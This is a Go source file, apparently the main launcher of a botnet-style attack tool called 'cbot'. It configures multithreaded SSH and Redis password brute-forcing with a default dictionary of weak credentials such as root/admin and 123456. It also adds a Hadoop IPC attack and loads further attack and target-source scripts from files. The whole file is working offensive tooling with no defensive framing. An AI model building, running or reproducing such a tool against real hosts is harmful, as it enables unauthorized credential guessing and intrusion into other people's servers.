package main

import (
	"flag"
	"github.com/cbot/attack"
	"github.com/cbot/attack/ascript"
	"github.com/cbot/attack/bruteforce"
	"github.com/cbot/attack/hadoop"
	"github.com/cbot/targets/local"
	"github.com/cbot/targets/source"
	"github.com/cbot/utils/jsonutils"
	"io/ioutil"
	"log"
	"os"
	"os/signal"
	"strconv"
	"strings"
	"syscall"
)

type AttackMain struct {

	spool *source.SourcePool

	attackTasks *attack.AttackTasks

	nodeInfo *local.NodeInfo

	dictPool *bruteforce.DictPool

}

func NewAttackMain(users []string,passwds []string) *AttackMain {


	nodeInfo := local.GetNodeInfo()
	spool := source.NewSourcePool()

	attackTasks := attack.NewAttackTasks(&attack.Config{
		TaskId:                "taskTest",
		MaxThreads:            100,
		SourceCapacity:        100,
		AttackProcessCapacity: 10,
		SBotHost:              "127.0.0.1",
		SBotPort:              3333,
	}, nodeInfo, spool)

	dictpool := bruteforce.NewDictPool()

	dictpool.Add(users,passwds)

	attackTasks.AddAttack(bruteforce.NewSSHBruteforceAttack(dictpool, attackTasks))
	attackTasks.AddAttack(bruteforce.NewRedisBruteforceAttack(dictpool, attackTasks))
	attackTasks.AddAttack(hadoop.NewHadoopIPCAttack(attackTasks))
	attackTasks.AddAttack(attack.NewAttackDump(attackTasks))

	return &AttackMain{
		spool:       spool,
		attackTasks: attackTasks,
		nodeInfo:    nodeInfo,
		dictPool:    dictpool,
	}
}


func (am *AttackMain) AddAttackSource(name string, types []string, fname string)  {

	content,err:= ioutil.ReadFile(fname)
	if err!=nil {
		log.Fatalf("Cannot Read source script file:%s",fname)

	}

	s, err := source.NewScriptSourceFromContent(am.spool, name, types, content)

	if err != nil {

		log.Fatalf("Load source script failed:%v",err)
	}

	log.Printf("Load source script ok,start to read source-----------------")

	am.spool.StartSource(s)
}

func (am *AttackMain) AddAttack(name string, attackType string, defaultProto string, defaultPort int, fname string)  {

	content,err:= ioutil.ReadFile(fname)
	if err!=nil {
		log.Fatalf("Cannot Read attack script file:%s",fname)
	}

	att, err := ascript.NewAttackScriptFromContent(am.attackTasks, name, attackType, defaultPort, defaultProto, content)

	if err != nil {
		log.Fatalf("Load attack script failed:%v",err)
	}

	log.Printf("Load attack script ok,prefare to wait attack -----------------")
	am.attackTasks.AddAttack(att)

}

func (am *AttackMain) waitAttackProcess() {

	attackProcessChan := am.attackTasks.SubAttackProcess()

	go func() {
		for {

			select {

			case ap := <-attackProcessChan:

				log.Printf("Receive a attack process:%s",jsonutils.ToJsonString(ap,true))
			}
		}
	}()
}



func main(){

	var attackMain *AttackMain

	attack := flag.String("addAttack","","add a attack script")
	source := flag.String("addSource","","add a attack source")
	dict :=flag.String("addDict","","add bruteforce dictory ")

	flag.Parse()


	if *source == "" {
		log.Fatalf("Must privode the attack source script")
	}

	if *dict == "" {

		attackMain = NewAttackMain([]string{"root","test","admin"},[]string{"root","test","admin","passwd","password","123456"})

	}else {

		args := strings.Split(*dict,":")
		if len(args)!=2 {
			log.Fatalf("Invalid dictory format,should as example:[root,admin,test:123456,passwd]")
		}

		attackMain = NewAttackMain(strings.Split(args[0],","),strings.Split(args[1],","))
	}

	if *attack!="" {

		attackArgs := strings.Split(*attack,":")
		if len(attackArgs)!=5 {
			log.Fatalf("Invalid attack  format,should as example:[name:attackType:defaultProto:defaultPort:fpath]")
		}

		port,err := strconv.ParseInt(attackArgs[3],10,32)
		if err!=nil {
			log.Fatalf("Parse the attack default port failed:%v",err)
		}

		attackMain.AddAttack(attackArgs[0],attackArgs[1],attackArgs[2], int(port),attackArgs[4])
	}

	attackMain.attackTasks.Start()

	sourceArgs := strings.Split(*source,":")

	if len(sourceArgs)!= 3 {
		log.Fatalf("Invalid attack source format,should as example:[name:types:fpath]")

	}

	attackMain.AddAttackSource(sourceArgs[0],strings.Split(sourceArgs[1],","),sourceArgs[2])


	attackMain.waitAttackProcess()

	waitExit()
}

func waitExit() {

	sigs := make(chan os.Signal, 1)

	signal.Notify(sigs, syscall.SIGINT, syscall.SIGTERM)

	<-sigs
}